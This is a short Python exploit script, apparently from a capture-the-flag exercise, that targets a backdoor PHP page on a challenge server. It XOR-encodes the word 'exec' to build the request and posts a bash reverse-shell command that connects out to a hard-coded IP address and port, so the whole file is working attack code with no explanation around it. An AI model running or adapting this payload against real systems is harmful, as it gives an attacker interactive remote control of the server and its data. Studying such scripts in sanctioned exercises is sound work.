#coding=utf-8
import requests

get = ''
for s1, s2 in zip('exec', 'd00r'):
    get += chr(ord(s1) ^ ord(s2))
post = {}
post['#'] = 'bash -i >& /dev/tcp/140.113.68.171/4546 0>&1'
#post['#'] = 'python -m SimpleHTTPServer 4546'
    
r = requests.post(url = 'http://edu-ctf.csie.org:10151/d00r.php?87={}'.format(get), data = post)
 
